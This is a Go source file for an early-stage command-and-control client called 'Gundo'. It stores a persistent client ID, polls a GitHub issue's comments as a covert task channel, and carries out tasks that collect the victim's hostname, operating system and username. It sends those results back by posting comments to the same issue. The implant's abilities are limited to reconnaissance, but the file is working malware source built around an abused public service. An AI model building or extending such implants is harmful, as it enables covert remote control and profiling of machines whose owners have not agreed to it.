package main

import (
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"uuid"
)

// fixed client version rep
const clientVersion = "0.1.0"

// in memory state that payload/process is running. It gives us a place to handle client specific behavior

type Client struct {
	ID        string
	Version   string
	StartedAt time.Time
	// set of task ID already handled to avoid duplicate execution
	// MB: Gonna keep this out for now given our program has no cases that could lead to dupe IDs. but of course in terms of the merit of engineering edge cases do happen and should be built into handle those
	// Processed map[string]struct{}
}

// checks to see if there is a ClientID generated
// if not generates a new one
func loadOrCreateClientID() (string, error) {
	configDir, err := os.UserConfigDir()
	if err != nil {
		return "", fmt.Errorf("get config directory: %w", err)
	}

	gundoDir := filepath.Join(configDir, "gundo")

	if err := os.MkdirAll(gundoDir, 0700); err != nil {
		return "", fmt.Errorf("create gundo config directory: %w", err)
	}

	idPath := filepath.Join(gundoDir, "client_id")

	data, err := os.ReadFile(idPath)

	// Existing ID found
	if err == nil {
		id := strings.TrimSpace(string(data))

		if id != "" {
			return id, nil
		}
	}

	// Something failed other than "file doesn't exist"
	if err != nil && !os.IsNotExist(err) {
		return "", fmt.Errorf("read client ID: %w", err)
	}

	// First run: generate persistent ID
	id := uuid.New().String()

	if err := os.WriteFile(idPath, []byte(id), 0600); err != nil {
		return "", fmt.Errorf("save client ID: %w", err)
	}

	return id, nil
}

// function to create a new client struct in memory and returns its address.
// that way we can actually modify the values in memory rather than a copy
func newClient() (*Client, error) {
	clientID, err := loadOrCreateClientID()
	if err != nil {
		return nil, err
	}

	return &Client{
		ID:        clientID,
		Version:   clientVersion,
		StartedAt: time.Now().UTC(),
	}, nil
}

/*

Client Behaviour:

1. GundoMessage Task recieved
2. client handles/executes task (client.handleTask(gundotask))
3. inspects the task action (ping, echo, stauts, etc.)
4. return the result as a GundoMessage onto repo
*/

func (c *Client) handleTask(task GundoMessage) GundoMessage {

	// Every result needs these common fields.
	// take task from param --> drop it in to start building result return struct --> populate struct with output and return it
	result := GundoMessage{
		Type:      "result",
		TaskID:    task.TaskID,
		ClientID:  c.ID,
		Status:    "success",
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}

	// Run only explicitly supported Gundo actions.
	switch task.Action {

	case "ping":
		result.Output = "pong"

	case "get_hostname":
		hostname, err := os.Hostname()
		if err != nil {
			result.Status = "error"
			result.Output = err.Error()
			break
		}

		result.Output = hostname

	case "get_os":
		result.Output = runtime.GOOS

	case "get_user":
		currentUser, err := user.Current()
		if err != nil {
			result.Status = "error"
			result.Output = err.Error()
			break
		}

		result.Output = currentUser.Username

	default:
		result.Status = "error"
		result.Output = "unsupported action"
	}

	return result
}

func (c *Client) pollTasks(issueNumber int) {

	// Get the comments that already exist when the client starts.
	comments, err := listComments(issueNumber)
	if err != nil {
		fmt.Printf("Error getting initial comments: %v\n", err)
		return
	}

	var lastSeenCommentID int64

	// Establish our starting point so we don't replay old tasks.
	if len(comments) > 0 {
		lastSeenCommentID = comments[len(comments)-1].ID
	}

	fmt.Printf("[+] Client %s listening for tasks...\n", c.ID)

	for {
		comments, err = listComments(issueNumber)
		if err != nil {
			fmt.Printf("Error polling comments: %v\n", err)
			time.Sleep(10 * time.Second)
			continue
		}

		// brute-force solution that can be fixed later
		for _, comment := range comments {

			// Ignore comments we've already seen.
			if comment.ID <= lastSeenCommentID {
				// continue always skips rest of iteration the moves on
				continue
			}

			// Mark this transport message as seen.
			lastSeenCommentID = comment.ID

			// Convert the GitHub comment body into a Gundo message.
			message, err := parseGundoMessage(comment.Body)
			if err != nil {
				fmt.Printf("Ignoring non-Gundo comment: %v\n", err)
				continue
			}

			// The client only executes task messages.
			if message.Type != "task" {
				continue
			}

			// Ignore tasks intended for a different client.
			if message.TargetClientID != c.ID {
				continue
			}

			fmt.Printf(
				"[+] Task received: %s (%s)\n",
				message.TaskID,
				message.Action,
			)

			// execute our supported action
			// supported action takes the struct, builds a new one, and returns it
			result := c.handleTask(message)

			// Send the result back through the same GitHub mailbox.
			err = createComment(issueNumber, result)
			if err != nil {
				fmt.Printf(
					"Error posting result for task %s: %v\n",
					message.TaskID,
					err,
				)
				continue
			}

			fmt.Printf(
				"[+] Result sent for task %s: %s\n",
				message.TaskID,
				result.Output,
			)
		}

		time.Sleep(10 * time.Second)
	}
}
